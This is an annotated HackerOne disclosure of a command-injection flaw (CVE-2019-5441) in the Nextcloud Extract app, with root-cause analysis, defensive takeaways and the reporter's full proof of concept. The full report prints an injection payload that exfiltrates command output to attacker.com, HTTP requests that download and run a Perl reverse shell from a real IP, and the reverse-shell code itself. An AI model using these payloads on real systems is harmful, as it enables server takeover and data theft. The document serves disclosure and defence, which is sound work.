# Remote Code Execution via Command Injection in Nextcloud Extract App Plugin

## Metadata
- **Source:** HackerOne
- **Report:** 546753 | https://hackerone.com/reports/546753
- **Submitted:** 2019-04-23
- **Reporter:** hdbreaker
- **Program:** Nextcloud
- **Bounty:** Not specified in writeup
- **Severity:** critical
- **Vuln:** Command Injection, OS Command Injection, Improper Input Validation, Unsafe Use of exec()
- **CVEs:** CVE-2019-5441
- **Category:** memory-binary

## Summary
The Extract app plugin for Nextcloud contains a critical command injection vulnerability in the RAR extraction functionality. User-controlled parameters ($file and $dir) are passed unsanitized to the exec() function, allowing attackers to execute arbitrary OS commands. An authenticated attacker can achieve remote code execution by uploading a RAR file and manipulating the extraction request parameters.

## Attack scenario
1. Attacker creates or uses existing Nextcloud demo instance and logs in with valid credentials
2. Attacker installs the Extract app plugin from the Nextcloud marketplace
3. Attacker uploads a malicious RAR file to their Nextcloud storage
4. Attacker uses the 'Extract Here' context menu and intercepts the HTTP request with Burp Suite
5. Attacker modifies the nameOfFile or directory parameters to inject shell metacharacters and commands (e.g., pipe to curl to download reverse shell)
6. Attacker sends the modified request, causing exec() to execute injected commands with web server privileges, achieving RCE

## Root cause
The ExtractionController.php line 102 passes unsanitized user input ($file and $dir variables) directly to the exec() function without proper escaping or validation. While the code uses double quotes around variables, it does not prevent command injection via shell metacharacters like pipes (|), semicolons, and command substitution syntax. The fallback unrar execution path lacks any input sanitization mechanism.

## Attacker mindset
An attacker with valid Nextcloud credentials seeks to escalate privileges from authenticated user to system-level code execution. By chaining the file upload functionality with command injection in the extraction feature, they can bypass application boundaries and execute arbitrary shell commands. The attacker demonstrates sophistication by first downloading a reverse shell script before executing it, enabling persistent interactive access.

## Defensive takeaways
- Never pass user-controlled input directly to exec(), system(), or shell_exec() functions - use parameterized alternatives like proc_open() with argument arrays
- Implement strict input validation and sanitization on all user-supplied parameters, especially those used in file operations
- Use escapeshellarg() and escapeshellcmd() functions as a minimum defense layer when shell invocation is unavoidable
- Prefer native PHP functions (rar_* extension) over shell command execution for archive operations
- Apply principle of least privilege - run web server processes with minimal required permissions, not as root or sudo
- Implement Content Security Policy headers and disable dangerous PHP functions like exec() in php.ini where possible
- Use allowlisting for file extensions rather than blocklisting malicious patterns
- Implement request token validation and rate limiting on file extraction endpoints
- Conduct security code review of third-party plugins before marketplace distribution
- Monitor and log all exec() calls with parameter logging for threat detection

## Variant hunting
Search for other exec()/system()/shell_exec() calls in Nextcloud plugins that process user file inputs
Audit other archive extraction plugins (ZipExtract, etc.) for similar command injection patterns
Test Extract app with different metacharacters: semicolons, backticks, $(), &&, ||, >, < redirects
Check if tar, unzip, or other archive utilities are called with unsanitized paths
Review file upload handlers for path traversal combined with command injection
Analyze other Nextcloud apps using external command execution for archive/image/document processing
Test for injection via directory parameter in parent/sibling directory traversal scenarios
Hunt for similar patterns in other file management applications (Pydio, OwnCloud, etc.)

## MITRE ATT&CK
- T1190
- T1059
- T1059.004
- T1078
- T1105
- T1571

## Notes
This vulnerability required authentication to trigger, reducing blast radius but still critical due to ease of exploitation. The writeup demonstrates excellent PoC methodology using two-stage payload delivery (download shell, then execute). The vulnerability affects the default fallback path when rar PHP extension is not loaded, making it more likely to be exploited in standard deployments. The attacker successfully demonstrated full system compromise on the official Nextcloud demo instance, proving real-world exploitability.

## Full report
<details><summary>Expand</summary>

Hi, I found a critical issue in the Add-on "Extract" listed in the Nextcloud Marketplace: https://apps.nextcloud.com/apps/extract (This extension can be installed directly from Nextcloud Application)

The vulnerability was found in file: extract/lib/Controller/ExtractionController.php line 102.

The affected code can be seen below:

```
if (extension_loaded ("rar")){
				$rar_file = rar_open($file);
				$list = rar_list($rar_file);
				var_dump($rar_file);
				foreach($list as $fileOpen) {
					$entry = rar_entry_get($rar_file, $fileOpen->getName());
					$entry->extract($dir); // extract to the current dir
					self::scanFolder('/'.$this->UserId.'/files'.$directory.'/'.$fileOpen->getName());
				}
				rar_close($rar_file); 
			}else{
                ######## BUG HERE #########
				exec("unrar x \"".$file."\" -R \"".$dir."\" -o+",$output,$return);
                #########################
				foreach ($output as $val ) {
					if(preg_split('/ /', $val, -1, PREG_SPLIT_NO_EMPTY)[0] == "Extracting" && 
					preg_split('/ /', $val, -1, PREG_SPLIT_NO_EMPTY)[1] != "from"){
						$fichier = substr(strrchr($PATH, "/"), 1);
						self::scanFolder('/'.$this->UserId.'/files'.$directory.'/'.$fichier);
					}
				}
			}
```

The unrar line allows Command Injection via $file and $dir parameters, an attacker could use the following payload in order to exploit a Remote Command Execution in a Nextcloud Server and exfiltrate data via Curl requests.

```
nameOfFile=sample.rar"|curl www.attacker.com:443/data?id=$(id | base64)|"&directory=&external=0
```

Abusing this issue I was able to take full control of the demo instance: https://demo.nextcloud.com/lun0shai/

The steps to reproduce this PoC can be seen below:

1) Create a demo instance in https://demo.nextcloud.com and login.
2) Install the plugin Extract directly from the Apps menu:

{F474350}

3) Once the Add-on is installed, the attacker needs to upload a sample.rar file:

{F474351}

4) Then, the attacker needs to use the functionality "Extract Here" from the context menu and intercept the HTTP Request with BurpSuite:

{F474352}

Burp Interceptor:
{F474356}

5) At this point, the attacker can manipulate the $nameOfFile and & $dir parameters to achieve Remote Code Execution in the Nextcloud Instance. This PoC of RCE was performed over a Demo Instance running the latest version of NextClou.

To achieve RCE over Demo Instance 2 payloads were needed:

a) The attacker needs to force the application to download a Perl Reverse Shell to /tmp folder using curl, this was achieved using the following HTTP Request:

Note: 
My server IP is: 138.68.1.244

HTTP Request:
```
POST /lun0shai/index.php/apps/extract/ajax/extractRar.php HTTP/1.1
Host: demo.nextcloud.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
requesttoken: v+/28PW5/gilVA9we7iR7yrAYLjQCiYpfyx4e+jIdPU=:24ODl5qN0WLLN14xF+vgrEC0EM/ifB55OxU1SIe+LcE=
OCS-APIREQUEST: true
X-Requested-With: XMLHttpRequest
Content-Length: 98
Connection: close
Cookie: oco9fwvj7vid=aashsh75p508m9qk0tdq0ahk8v; oc_sessionPassphrase=XmIYyFzOLH1JtcvmdyZ6JbO67Sh1lbdC6UlHe0FkyVXeu5e2gA%2FOloJaUrRkXAb8sDLgF2pQYpUh1NlHeS8rpppQZakBiTH3K9%2FwWAytej%2FCTkV9%2FurYyRaMVQWLbAyu; nc_sameSiteCookielax=true; nc_sameSiteCookiestrict=true; nc_username=admin; nc_token=eGciTpRb4Bu7DpG2ohUjUWhAd%2BjQGRbb; nc_session_id=aashsh75p508m9qk0tdq0ahk8v

nameOfFile=sample.rar"|curl http://138.68.1.244/shell.pl -o /tmp/shell2.pl|"&directory=&external=0
```

HTTP Response:
```
HTTP/1.1 200 OK
Date: Tue, 23 Apr 2019 08:24:50 GMT
Server: Apache
Strict-Transport-Security: max-age=15768000
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-cache, no-store, must-revalidate
Pragma: no-cache
Content-Security-Policy: default-src 'none';base-uri 'none';manifest-src 'self';script-src 'nonce-bXBVNko3dWtWZnFVMzl3QnpTMHBlSkwvYlhhSWtLczZXelhlTFRkMGNJdz06L3ZsUFFOU1FlcEQ2dkkxQW9YNVlPL2lMSFFHNjVwTnFId3lUSGxnQ0tiZz0=';style-src 'self' 'unsafe-inline';img-src 'self' data: blob:;font-src 'self' data:;connect-src 'self' stun.nextcloud.com:443;media-src 'self';frame-src https://demo.nextcloud.com
X-Frame-Options: SAMEORIGIN
Content-Length: 4
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
X-Robots-Tag: none
X-Download-Options: noopen
X-Permitted-Cross-Domain-Policies: none
Referrer-Policy: no-referrer
Content-Type: application/json; charset=utf-8
Connection: close

null
```

The above request wrote the following reverse shell in /tmp/shell.pl
```
use Socket;$i="138.68.1.244";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}
```

(At this point a Netcat Listener was running on my Server)
{F474360}

b) A second HTTP Request was needed to execute the Perl Reverse Shell and gain full shell access over the remote server (demo.nextcloud.com):

HTTP Request:
```
POST /lun0shai/index.php/apps/extract/ajax/extractRar.php HTTP/1.1
Host: demo.nextcloud.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
requesttoken: v+/28PW5/gilVA9we7iR7yrAYLjQCiYpfyx4e+jIdPU=:24ODl5qN0WLLN14xF+vgrEC0EM/ifB55OxU1SIe+LcE=
OCS-APIREQUEST: true
X-Requested-With: XMLHttpRequest
Content-Length: 66
Connection: close
Cookie: oco9fwvj7vid=aashsh75p508m9qk0tdq0ahk8v; oc_sessionPassphrase=XmIYyFzOLH1JtcvmdyZ6JbO67Sh1lbdC6UlHe0FkyVXeu5e2gA%2FOloJaUrRkXAb8sDLgF2pQYpUh1NlHeS8rpppQZakBiTH3K9%2FwWAytej%2FCTkV9%2FurYyRaMVQWLbAyu; nc_sameSiteCookielax=true; nc_sameSiteCookiestrict=true; nc_username=admin; nc_token=eGciTpRb4Bu7DpG2ohUjUWhAd%2BjQGRbb; nc_session_id=aashsh75p508m9qk0tdq0ahk8v

nameOfFile=sample.rar"|perl /tmp/shell2.pl|"&directory=&external=0
```

After these steps, my Server (IP: 138.68.1.244) received the Reverse Shell successfully and I was able to move freely over the Docker Instance of Nextcloud, reading even the config file as can be seen below:

An inbound connection from demo.nextcloud.com was received
{F474361}

Content of /config/config.php
{F474362}

Hope this could help to improve your security and check continuously the Applications that you spread using your market.

Please do not hesitate to contact me if you need any help to detect/resolve this issue.

Regards,

## Impact

An authenticated user could use the Extract Plugin listed in the Apps Market of Nextcloud to achieve Remote Code Execution in any Nextcloud instance.

</details>

---
*Analysed by Claude on 2026-05-11*
